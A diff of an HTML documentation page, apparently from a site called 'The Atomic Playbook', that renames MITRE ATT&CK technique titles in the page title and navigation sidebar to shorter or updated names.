@@ -6,7 +6,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
 
-    <title>T1003.001 - OS Credential Dumping: LSASS Memory &#8212; The Atomic Playbook</title>
+    <title>T1003.001 - LSASS Memory &#8212; The Atomic Playbook</title>
     
   <!-- Loaded before other Sphinx assets -->
   <link href="../../_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
@@ -52,7 +52,7 @@ const thebe_selector_output = ".output, .cell_output"
     <script async="async" src="../../_static/sphinx-thebe.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
-    <link rel="next" title="T1003.002 - OS Credential Dumping: Security Account Manager" href="T1003.002.html" />
+    <link rel="next" title="T1003.002 - Security Account Manager" href="T1003.002.html" />
     <link rel="prev" title="Credential Access" href="../credential-access.html" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="docsearch:language" content="None">
@@ -126,7 +126,7 @@ const thebe_selector_output = ".output, .cell_output"
   <ul>
    <li class="toctree-l2">
     <a class="reference internal" href="../initial-access/T1078.001.html">
-     T1078.001 - Valid Accounts: Default Accounts
+     T1078.001 - Default Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -136,12 +136,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../initial-access/T1078.003.html">
-     T1078.003 - Valid Accounts: Local Accounts
+     T1078.003 - Local Accounts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../initial-access/T1078.004.html">
-     T1078.004 - Valid Accounts: Cloud Accounts
+     T1078.004 - Cloud Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -216,7 +216,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../initial-access/T1566.001.html">
-     T1566.001 - Phishing: Spearphishing Attachment
+     T1566.001 - Spearphishing Attachment
     </a>
    </li>
    <li class="toctree-l2">
@@ -268,12 +268,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1053.002.html">
-     T1053.002 - Scheduled Task/Job: At
+     T1053.002 - At
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1053.003.html">
-     T1053.003 - Scheduled Task/Job: Cron
+     T1053.003 - Cron
     </a>
    </li>
    <li class="toctree-l2">
@@ -283,17 +283,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1053.005.html">
-     T1053.005 - Scheduled Task/Job: Scheduled Task
+     T1053.005 - Scheduled Task
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1053.006.html">
-     T1053.006 - Scheduled Task/Job: Systemd Timers
+     T1053.006 - Systemd Timers
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1053.007.html">
-     T1053.007 - Kubernetes Cronjob
+     T1053.007 - Container Orchestration Job
     </a>
    </li>
    <li class="toctree-l2">
@@ -303,37 +303,37 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.001.html">
-     T1059.001 - Command and Scripting Interpreter: PowerShell
+     T1059.001 - PowerShell
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.002.html">
-     T1059.002 - Command and Scripting Interpreter: AppleScript
+     T1059.002 - AppleScript
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.003.html">
-     T1059.003 - Command and Scripting Interpreter: Windows Command Shell
+     T1059.003 - Windows Command Shell
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.004.html">
-     T1059.004 - Command and Scripting Interpreter: Bash
+     T1059.004 - Unix Shell
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.005.html">
-     T1059.005 - Command and Scripting Interpreter: Visual Basic
+     T1059.005 - Visual Basic
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.006.html">
-     T1059.006 - Command and Scripting Interpreter: Python
+     T1059.006 - Python
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1059.007.html">
-     T1059.007 - Command and Scripting Interpreter: JavaScript
+     T1059.007 - JavaScript
     </a>
    </li>
    <li class="toctree-l2">
@@ -468,7 +468,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1204.002.html">
-     T1204.002 - User Execution: Malicious File
+     T1204.002 - Malicious File
     </a>
    </li>
    <li class="toctree-l2">
@@ -493,7 +493,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1559.002.html">
-     T1559.002 - Inter-Process Communication: Dynamic Data Exchange
+     T1559.002 - Dynamic Data Exchange
     </a>
    </li>
    <li class="toctree-l2">
@@ -508,12 +508,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1569.001.html">
-     T1569.001 - System Services: Launchctl
+     T1569.001 - Launchctl
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1569.002.html">
-     T1569.002 - System Services: Service Execution
+     T1569.002 - Service Execution
     </a>
    </li>
    <li class="toctree-l2">
@@ -523,12 +523,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1609.html">
-     T1609 - Kubernetes Exec Into Container
+     T1609 - Container Administration Command
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../execution/T1610.html">
-     T1610 - Deploy a container
+     T1610 - Deploy Container
     </a>
    </li>
    <li class="toctree-l2">
@@ -585,12 +585,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1037.001.html">
-     T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows)
+     T1037.001 - Logon Script (Windows)
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1037.002.html">
-     T1037.002 - Boot or Logon Initialization Scripts: Logon Script (Mac)
+     T1037.002 - Login Hook
     </a>
    </li>
    <li class="toctree-l2">
@@ -600,12 +600,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1037.004.html">
-     T1037.004 - Boot or Logon Initialization Scripts: Rc.common
+     T1037.004 - RC Scripts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1037.005.html">
-     T1037.005 - Boot or Logon Initialization Scripts: Startup Items
+     T1037.005 - Startup Items
     </a>
    </li>
    <li class="toctree-l2">
@@ -640,12 +640,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1053.002.html">
-     T1053.002 - Scheduled Task/Job: At
+     T1053.002 - At
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1053.003.html">
-     T1053.003 - Scheduled Task/Job: Cron
+     T1053.003 - Cron
     </a>
    </li>
    <li class="toctree-l2">
@@ -655,17 +655,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1053.005.html">
-     T1053.005 - Scheduled Task/Job: Scheduled Task
+     T1053.005 - Scheduled Task
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1053.006.html">
-     T1053.006 - Scheduled Task/Job: Systemd Timers
+     T1053.006 - Systemd Timers
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1053.007.html">
-     T1053.007 - Kubernetes Cronjob
+     T1053.007 - Container Orchestration Job
     </a>
    </li>
    <li class="toctree-l2">
@@ -695,7 +695,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1078.001.html">
-     T1078.001 - Valid Accounts: Default Accounts
+     T1078.001 - Default Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -705,12 +705,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1078.003.html">
-     T1078.003 - Valid Accounts: Local Accounts
+     T1078.003 - Local Accounts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1078.004.html">
-     T1078.004 - Valid Accounts: Cloud Accounts
+     T1078.004 - Cloud Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -725,7 +725,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1098.001.html">
-     T1098.001 - Account Manipulation: Additional Cloud Credentials
+     T1098.001 - Additional Cloud Credentials
     </a>
    </li>
    <li class="toctree-l2">
@@ -800,17 +800,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1136.001.html">
-     T1136.001 - Create Account: Local Account
+     T1136.001 - Local Account
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1136.002.html">
-     T1136.002 - Create Account: Domain Account
+     T1136.002 - Domain Account
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1136.003.html">
-     T1136.003 - Create Account: Cloud Account
+     T1136.003 - Cloud Account
     </a>
    </li>
    <li class="toctree-l2">
@@ -825,7 +825,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1137.002.html">
-     T1137.002 - Office Application Startup: Office Test
+     T1137.002 - Office Test
     </a>
    </li>
    <li class="toctree-l2">
@@ -835,7 +835,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1137.004.html">
-     T1137.004 - Office Application Startup: Outlook Home Page
+     T1137.004 - Outlook Home Page
     </a>
    </li>
    <li class="toctree-l2">
@@ -845,7 +845,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1137.006.html">
-     T1137.006 - Office Application Startup: Add-ins
+     T1137.006 - Add-ins
     </a>
    </li>
    <li class="toctree-l2">
@@ -1015,12 +1015,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1505.002.html">
-     T1505.002 - Server Software Component: Transport Agent
+     T1505.002 - Transport Agent
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1505.003.html">
-     T1505.003 - Server Software Component: Web Shell
+     T1505.003 - Web Shell
     </a>
    </li>
    <li class="toctree-l2">
@@ -1080,22 +1080,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1543.001.html">
-     T1543.001 - Create or Modify System Process: Launch Agent
+     T1543.001 - Launch Agent
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1543.002.html">
-     T1543.002 - Create or Modify System Process: Systemd Service
+     T1543.002 - Systemd Service
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1543.003.html">
-     T1543.003 - Create or Modify System Process: Windows Service
+     T1543.003 - Windows Service
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1543.004.html">
-     T1543.004 - Create or Modify System Process: Launch Daemon
+     T1543.004 - Launch Daemon
     </a>
    </li>
    <li class="toctree-l2">
@@ -1105,27 +1105,27 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.001.html">
-     T1546.001 - Event Triggered Execution: Change Default File Association
+     T1546.001 - Change Default File Association
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.002.html">
-     T1546.002 - Event Triggered Execution: Screensaver
+     T1546.002 - Screensaver
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.003.html">
-     T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
+     T1546.003 - Windows Management Instrumentation Event Subscription
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.004.html">
-     T1546.004 - Event Triggered Execution: .bash_profile and .bashrc
+     T1546.004 - Unix Shell Configuration Modification
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.005.html">
-     T1546.005 - Event Triggered Execution: Trap
+     T1546.005 - Trap
     </a>
    </li>
    <li class="toctree-l2">
@@ -1135,47 +1135,47 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.007.html">
-     T1546.007 - Event Triggered Execution: Netsh Helper DLL
+     T1546.007 - Netsh Helper DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.008.html">
-     T1546.008 - Event Triggered Execution: Accessibility Features
+     T1546.008 - Accessibility Features
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.009.html">
-     T1546.009 - Event Triggered Execution: AppCert DLLs
+     T1546.009 - AppCert DLLs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.010.html">
-     T1546.010 - Event Triggered Execution: AppInit DLLs
+     T1546.010 - AppInit DLLs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.011.html">
-     T1546.011 - Event Triggered Execution: Application Shimming
+     T1546.011 - Application Shimming
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.012.html">
-     T1546.012 - Event Triggered Execution: Image File Execution Options Injection
+     T1546.012 - Image File Execution Options Injection
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.013.html">
-     T1546.013 - Event Triggered Execution: PowerShell Profile
+     T1546.013 - PowerShell Profile
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.014.html">
-     T1546.014 - Event Triggered Execution: Emond
+     T1546.014 - Emond
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1546.015.html">
-     T1546.015 - Event Triggered Execution: Component Object Model Hijacking
+     T1546.015 - Component Object Model Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -1190,7 +1190,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.001.html">
-     T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+     T1547.001 - Registry Run Keys / Startup Folder
     </a>
    </li>
    <li class="toctree-l2">
@@ -1205,37 +1205,37 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.004.html">
-     T1547.004 - Boot or Logon Autostart Execution: Winlogon Helper DLL
+     T1547.004 - Winlogon Helper DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.005.html">
-     T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
+     T1547.005 - Security Support Provider
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.006.html">
-     T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
+     T1547.006 - Kernel Modules and Extensions
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.007.html">
-     T1547.007 - Boot or Logon Autostart Execution: Re-opened Applications
+     T1547.007 - Re-opened Applications
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.008.html">
-     T1547.008 - Boot or Logon Autostart Execution: LSASS Driver
+     T1547.008 - LSASS Driver
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.009.html">
-     T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification
+     T1547.009 - Shortcut Modification
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.010.html">
-     T1547.010 - Boot or Logon Autostart Execution: Port Monitors
+     T1547.010 - Port Monitors
     </a>
    </li>
    <li class="toctree-l2">
@@ -1260,7 +1260,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1547.015.html">
-     T1547.015 - Boot or Logon Autostart Execution: Login Items
+     T1547.015 - Login Items
     </a>
    </li>
    <li class="toctree-l2">
@@ -1280,12 +1280,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1556.002.html">
-     T1556.002 - Modify Authentication Process: Password Filter DLL
+     T1556.002 - Password Filter DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1556.003.html">
-     T1556.003 - Modify Authentication Process: Pluggable Authentication Modules
+     T1556.003 - Pluggable Authentication Modules
     </a>
    </li>
    <li class="toctree-l2">
@@ -1315,12 +1315,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.001.html">
-     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
+     T1574.001 - DLL Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.002.html">
-     T1574.002 - Hijack Execution Flow: DLL Side-Loading
+     T1574.002 - DLL Side-Loading
     </a>
    </li>
    <li class="toctree-l2">
@@ -1335,7 +1335,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.006.html">
-     T1574.006 - Hijack Execution Flow: LD_PRELOAD
+     T1574.006 - Dynamic Linker Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -1345,12 +1345,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.008.html">
-     T1574.008 - Hijack Execution Flow: Path Interception by Search Order Hijacking
+     T1574.008 - Path Interception by Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.009.html">
-     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+     T1574.009 - Path Interception by Unquoted Path
     </a>
    </li>
    <li class="toctree-l2">
@@ -1360,12 +1360,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.011.html">
-     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
+     T1574.011 - Services Registry Permissions Weakness
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../persistence/T1574.012.html">
-     T1574.012 - Hijack Execution Flow: COR_PROFILER
+     T1574.012 - COR_PROFILER
     </a>
    </li>
    <li class="toctree-l2">
@@ -1407,12 +1407,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1037.001.html">
-     T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows)
+     T1037.001 - Logon Script (Windows)
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1037.002.html">
-     T1037.002 - Boot or Logon Initialization Scripts: Logon Script (Mac)
+     T1037.002 - Login Hook
     </a>
    </li>
    <li class="toctree-l2">
@@ -1422,12 +1422,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1037.004.html">
-     T1037.004 - Boot or Logon Initialization Scripts: Rc.common
+     T1037.004 - RC Scripts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1037.005.html">
-     T1037.005 - Boot or Logon Initialization Scripts: Startup Items
+     T1037.005 - Startup Items
     </a>
    </li>
    <li class="toctree-l2">
@@ -1457,12 +1457,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1053.002.html">
-     T1053.002 - Scheduled Task/Job: At
+     T1053.002 - At
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1053.003.html">
-     T1053.003 - Scheduled Task/Job: Cron
+     T1053.003 - Cron
     </a>
    </li>
    <li class="toctree-l2">
@@ -1472,17 +1472,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1053.005.html">
-     T1053.005 - Scheduled Task/Job: Scheduled Task
+     T1053.005 - Scheduled Task
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1053.006.html">
-     T1053.006 - Scheduled Task/Job: Systemd Timers
+     T1053.006 - Systemd Timers
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1053.007.html">
-     T1053.007 - Kubernetes Cronjob
+     T1053.007 - Container Orchestration Job
     </a>
    </li>
    <li class="toctree-l2">
@@ -1492,7 +1492,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1055.001.html">
-     T1055.001 - Process Injection: Dynamic-link Library Injection
+     T1055.001 - Dynamic-link Library Injection
     </a>
    </li>
    <li class="toctree-l2">
@@ -1507,7 +1507,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1055.004.html">
-     T1055.004 - Process Injection: Asynchronous Procedure Call
+     T1055.004 - Asynchronous Procedure Call
     </a>
    </li>
    <li class="toctree-l2">
@@ -1532,7 +1532,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1055.012.html">
-     T1055.012 - Process Injection: Process Hollowing
+     T1055.012 - Process Hollowing
     </a>
    </li>
    <li class="toctree-l2">
@@ -1567,7 +1567,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1078.001.html">
-     T1078.001 - Valid Accounts: Default Accounts
+     T1078.001 - Default Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -1577,12 +1577,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1078.003.html">
-     T1078.003 - Valid Accounts: Local Accounts
+     T1078.003 - Local Accounts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1078.004.html">
-     T1078.004 - Valid Accounts: Cloud Accounts
+     T1078.004 - Cloud Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -1607,7 +1607,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1134.001.html">
-     T1134.001 - Access Token Manipulation: Token Impersonation/Theft
+     T1134.001 - Token Impersonation/Theft
     </a>
    </li>
    <li class="toctree-l2">
@@ -1622,12 +1622,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1134.004.html">
-     T1134.004 - Access Token Manipulation: Parent PID Spoofing
+     T1134.004 - Parent PID Spoofing
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1134.005.html">
-     T1134.005 - Access Token Manipulation: SID-History Injection
+     T1134.005 - SID-History Injection
     </a>
    </li>
    <li class="toctree-l2">
@@ -1702,7 +1702,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1484.001.html">
-     T1484.001 - Domain Policy Modification: Group Policy Modification
+     T1484.001 - Group Policy Modification
     </a>
    </li>
    <li class="toctree-l2">
@@ -1737,22 +1737,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1543.001.html">
-     T1543.001 - Create or Modify System Process: Launch Agent
+     T1543.001 - Launch Agent
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1543.002.html">
-     T1543.002 - Create or Modify System Process: Systemd Service
+     T1543.002 - Systemd Service
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1543.003.html">
-     T1543.003 - Create or Modify System Process: Windows Service
+     T1543.003 - Windows Service
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1543.004.html">
-     T1543.004 - Create or Modify System Process: Launch Daemon
+     T1543.004 - Launch Daemon
     </a>
    </li>
    <li class="toctree-l2">
@@ -1762,27 +1762,27 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.001.html">
-     T1546.001 - Event Triggered Execution: Change Default File Association
+     T1546.001 - Change Default File Association
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.002.html">
-     T1546.002 - Event Triggered Execution: Screensaver
+     T1546.002 - Screensaver
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.003.html">
-     T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
+     T1546.003 - Windows Management Instrumentation Event Subscription
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.004.html">
-     T1546.004 - Event Triggered Execution: .bash_profile and .bashrc
+     T1546.004 - Unix Shell Configuration Modification
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.005.html">
-     T1546.005 - Event Triggered Execution: Trap
+     T1546.005 - Trap
     </a>
    </li>
    <li class="toctree-l2">
@@ -1792,47 +1792,47 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.007.html">
-     T1546.007 - Event Triggered Execution: Netsh Helper DLL
+     T1546.007 - Netsh Helper DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.008.html">
-     T1546.008 - Event Triggered Execution: Accessibility Features
+     T1546.008 - Accessibility Features
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.009.html">
-     T1546.009 - Event Triggered Execution: AppCert DLLs
+     T1546.009 - AppCert DLLs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.010.html">
-     T1546.010 - Event Triggered Execution: AppInit DLLs
+     T1546.010 - AppInit DLLs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.011.html">
-     T1546.011 - Event Triggered Execution: Application Shimming
+     T1546.011 - Application Shimming
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.012.html">
-     T1546.012 - Event Triggered Execution: Image File Execution Options Injection
+     T1546.012 - Image File Execution Options Injection
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.013.html">
-     T1546.013 - Event Triggered Execution: PowerShell Profile
+     T1546.013 - PowerShell Profile
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.014.html">
-     T1546.014 - Event Triggered Execution: Emond
+     T1546.014 - Emond
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1546.015.html">
-     T1546.015 - Event Triggered Execution: Component Object Model Hijacking
+     T1546.015 - Component Object Model Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -1847,7 +1847,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.001.html">
-     T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+     T1547.001 - Registry Run Keys / Startup Folder
     </a>
    </li>
    <li class="toctree-l2">
@@ -1862,37 +1862,37 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.004.html">
-     T1547.004 - Boot or Logon Autostart Execution: Winlogon Helper DLL
+     T1547.004 - Winlogon Helper DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.005.html">
-     T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
+     T1547.005 - Security Support Provider
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.006.html">
-     T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
+     T1547.006 - Kernel Modules and Extensions
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.007.html">
-     T1547.007 - Boot or Logon Autostart Execution: Re-opened Applications
+     T1547.007 - Re-opened Applications
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.008.html">
-     T1547.008 - Boot or Logon Autostart Execution: LSASS Driver
+     T1547.008 - LSASS Driver
     </a>
    </li>
